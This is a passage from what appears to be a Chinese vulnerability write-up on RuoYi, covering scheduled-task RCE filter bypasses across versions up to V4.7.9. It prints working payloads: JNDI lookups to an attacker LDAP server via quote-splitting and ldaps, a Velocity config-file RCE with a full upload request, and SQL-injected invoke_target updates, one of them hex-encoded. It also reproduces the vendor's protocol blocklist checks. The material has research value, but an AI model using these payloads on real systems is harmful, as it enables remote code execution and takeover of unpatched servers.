<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749500213-4f106d97-20bf-4989-bb41-6477afa4750a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749572763-11da9b25-2526-4689-a529-a9bed5a564a1.png" srcset="/img/loading.gif" lazyload></p>
<p>在 V4.7.1 版本中添加了对执行方法的过滤，不允许执行<code>org.springframework.jndi</code>、<code>javax.naming.InitialContext</code>、<code>org.yaml.snakeyaml</code>、<code>java.net.URL</code>，因此仅通过<code>&#39;</code>去绕过已经不能够实现</p>
<h3 id="漏洞分析-12"><a href="#漏洞分析-12" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>详细的定时任务添加和执行可以参考 4.1 小节的漏洞分析；</p>
<p>在 4.7.1 时对定时任务调用的目标字符串进行了过滤，过滤了<code>rmi://</code>、<code>ldap://</code>、<code>http(s)://</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，Cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;rmi://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_LDAP))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;ldap://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; Constants.HTTP, Constants.HTTPS &#125;))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;http(s)//&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>过滤了上述的内容只要尝试绕过即可，通过<code>ldaps://</code>即可实现绕过；但是 <code>ldaps://</code>有点难搭建，因此尝试通过其他方法进行过滤</p>
<p>通过观察定时任务执行过程中的执行函数<code>invokeMethod</code>，其在获取方法参数<code>List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);</code>的过程中参在问题，因此导致的漏洞；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 执行方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sysJob 系统任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">invokeTarget</span> <span class="hljs-operator">=</span> sysJob.getInvokeTarget();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> getBeanName(invokeTarget);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> getMethodName(invokeTarget);<br>    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);<br>    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))<br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> SpringUtils.getBean(beanName);<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> Class.forName(beanName).newInstance();<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由于这个函数对参数的处理，将<code>&#39;</code>替换为 null，从而导致可以通过<code>&#39;ld&#39;ap://xxx.xx.xx.xxx:1389/&#39;</code>绕过<code>ldap://</code>的过滤；因为在执行过程中都会将<code>&#39;</code>替换掉，从而获取参数<code>ldap://xxx.xx.xx.xxx:1389/</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取method方法参数相关列表</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> invokeTarget 目标字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> method方法相关参数列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)<br>&#123;<br>    <span class="hljs-comment">// 获取由()包裹的内容</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodStr</span> <span class="hljs-operator">=</span> StringUtils.substringBetween(invokeTarget, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 根据逗号,分割内容</span><br>    String[] methodParams = methodStr.split(<span class="hljs-string">&quot;,&quot;</span>);<br>    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringUtils.trimToEmpty(methodParams[i]);<br>        <span class="hljs-comment">// String字符串类型，包含&#x27;</span><br>        <span class="hljs-keyword">if</span> (StringUtils.contains(str, <span class="hljs-string">&quot;&#x27;&quot;</span>))<br>        &#123;<br>            <span class="hljs-comment">//若分割出来的字符串中包含&#x27;，则将其替换为null</span><br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; StringUtils.replace(str, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), String.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// boolean布尔类型，等于true或者false</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(str, <span class="hljs-string">&quot;true&quot;</span>) || StringUtils.equalsIgnoreCase(str, <span class="hljs-string">&quot;false&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Boolean.valueOf(str), Boolean.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// long长整形，包含L</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">&quot;L&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Long.valueOf(StringUtils.replaceIgnoreCase(str, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)), Long.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// double浮点类型，包含D</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">&quot;D&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Double.valueOf(StringUtils.replaceIgnoreCase(str, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)), Double.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 其他类型归类为整形</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(str), Integer.class &#125;);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> classs;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="4-3-定时任务-RCE-bypass2（"><a href="#4-3-定时任务-RCE-bypass2（" class="headerlink" title="4.3 定时任务 RCE bypass2（&lt;V4.7.3）"></a>4.3 定时任务 RCE bypass2（&lt;V4.7.3）</h2><h3 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p>
<p>这里的 RCE 的方法还挺多的具体参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10405">https://xz.aliyun.com/news/10405</a></p>
<ul>
<li><strong>ldaps 绕过</strong></li>
</ul>
<p>这种过滤方法能够成功，但是我在复现的过程中遇到了证书问题，要求是需要配置相关的证书这种也是没有进一步的配置。</p>
<p>本次漏洞复现需要使用到工具：<a target="_blank" rel="noopener" href="https://github.com/phith0n/tls_proxy">https://github.com/phith0n/tls_proxy</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup.getDataSource(<span class="hljs-string">&#x27;ldaps://xx.xx.xxx.xx:1388/Basic/Command/calc.exe&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>在版本 V4.7.3 中将<code>ldap://</code>的过滤修改为对<code>ldap</code>进行过滤，因此不能够在使用<code>ldaps</code>进行绕过；</p>
<ul>
<li><strong>配置文件 RCE</strong></li>
</ul>
<p>若依中有个文件上传接口<code>/common/upload</code>，可以通过该接口实现文件上传将配置文件上传到服务端；然后使用<code>org.apache.velocity.runtime.RuntimeInstance.init</code>加载这个配置文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">resource.loader = ds<br>ds.resource.loader.<span class="hljs-keyword">public</span>.name = DataSource<br>ds.resource.loader.description = Velocity DataSource Resource Loader<br>ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader<br>ds.resource.loader.datasource_url = ldap:<span class="hljs-comment">//xx.xx.xxx.xx:1388/Basic/Command/calc.exe</span><br>ds.resource.loader.resource.table = tb_velocity_template<br>ds.resource.loader.resource.keycolumn = id_template<br>ds.resource.loader.resource.templatecolumn = template_definition<br>ds.resource.loader.resource.timestampcolumn = template_timestamp<br>ds.resource.loader.cache = <span class="hljs-literal">false</span><br>ds.resource.loader.modificationCheckInterval = <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /common/upload HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=----geckoformboundary4e4431b166ddca122d213d464704255e</span><br><span class="hljs-comment">Content-Length: 860</span><br><span class="hljs-comment">Origin: null</span><br><span class="hljs-comment">Cookie: JSESSIONID=e09af19d-5ba6-4ae2-899d-125e293ae3df</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------geckoformboundary4e4431b166ddca122d213d464704255e</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;velocity.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">resource.loader = ds</span><br><span class="hljs-comment">ds.resource.loader.public.name = DataSource</span><br><span class="hljs-comment">ds.resource.loader.description = Velocity DataSource Resource Loader</span><br><span class="hljs-comment">ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader</span><br><span class="hljs-comment">ds.resource.loader.datasource_url = ldap://xx.xx.xxx.xx:1388/Basic/Command/calc.exe</span><br><span class="hljs-comment">ds.resource.loader.resource.table = tb_velocity_template</span><br><span class="hljs-comment">ds.resource.loader.resource.keycolumn = id_template</span><br><span class="hljs-comment">ds.resource.loader.resource.templatecolumn = template_definition</span><br><span class="hljs-comment">ds.resource.loader.resource.timestampcolumn = template_timestamp</span><br><span class="hljs-comment">ds.resource.loader.cache = false</span><br><span class="hljs-comment">ds.resource.loader.modificationCheckInterval = 60</span><br><span class="hljs-comment">------geckoformboundary4e4431b166ddca122d213d464704255e--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904759348-7673fd94-148b-4b42-a70e-55da879fb4d0.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//192.168.1.9/profile/upload/2025/08/11/7c862b8b-e72f-4b61-ae38-95f15403ac21.txt</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.velocity.runtime.RuntimeInstance.init(<span class="hljs-string">&#x27;C:/code/Java/RuoYi/upload/upload/2025/08/11/7c862b8b-e72f-4b61-ae38-95f15403ac21.txt&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904808595-bda62aab-4b2b-445b-8f4d-51a0768b259e.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904840977-6bb2f97c-6e05-4fd1-8388-fe8ea181f511.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904795326-0f91a9ab-b0a9-4212-8c34-ff31209f6583.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-13"><a href="#漏洞分析-13" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p>
<p>这里的漏洞分析只针对 ldaps bypass 的分析，对于配置文件 RCE 的方法我这里就不进行分析了</p>
<blockquote>
<p>配置文件 RCE 的方法简单来说就是让 velocity 使用我们设定的配置文件重新加载，在重新加载的过程中触发了远程 ldap 请求导致的 rce；</p>
</blockquote>
<p>根据下面方法的具体内容，也是可以发现，通过<code>&#39;ld&#39;ap://&#39;</code>方式进行绕过已经不能够实现了；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取method方法参数相关列表</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> invokeTarget 目标字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> method方法相关参数列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodStr</span> <span class="hljs-operator">=</span> StringUtils.substringBetween(invokeTarget, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    String[] methodParams = methodStr.split(<span class="hljs-string">&quot;,(?=([^\&quot;&#x27;]*[\&quot;&#x27;][^\&quot;&#x27;]*[\&quot;&#x27;])*[^\&quot;&#x27;]*$)&quot;</span>);<br>    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringUtils.trimToEmpty(methodParams[i]);<br>        <span class="hljs-comment">// String字符串类型，以&#x27;或&quot;开头</span><br>        <span class="hljs-keyword">if</span> (StringUtils.startsWithAny(str, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; StringUtils.substring(str, <span class="hljs-number">1</span>, str.length() - <span class="hljs-number">1</span>), String.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// boolean布尔类型，等于true或者false</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(str) || <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(str))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Boolean.valueOf(str), Boolean.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// long长整形，以L结尾</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.endsWith(str, <span class="hljs-string">&quot;L&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Long.valueOf(StringUtils.substring(str, <span class="hljs-number">0</span>, str.length() - <span class="hljs-number">1</span>)), Long.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// double浮点类型，以D结尾</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.endsWith(str, <span class="hljs-string">&quot;D&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Double.valueOf(StringUtils.substring(str, <span class="hljs-number">0</span>, str.length() - <span class="hljs-number">1</span>)), Double.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 其他类型归类为整形</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(str), Integer.class &#125;);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> classs;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>尽管如何，在添加定时任务时，并没有对<code>ldaps</code>进行过滤，因此仍然能够通过<code>ldaps</code>协议实现 rce；（只是 ldaps 并没有那么容易实现就是啦）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，Cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;rmi://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_LDAP))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;ldap://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; Constants.HTTP, Constants.HTTPS &#125;))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;http(s)//&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), Constants.JOB_ERROR_STR))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串存在违规&quot;</span>);<br>    &#125;<br>    job.setCreateBy(getLoginName());<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="4-4-定时任务-RCE-bypass3（"><a href="#4-4-定时任务-RCE-bypass3（" class="headerlink" title="4.4 定时任务 RCE bypass3（&lt;V4.7.9）"></a>4.4 定时任务 RCE bypass3（&lt;V4.7.9）</h2><h3 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br>genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>首先添加一个任意内容的定时任务执行</p>
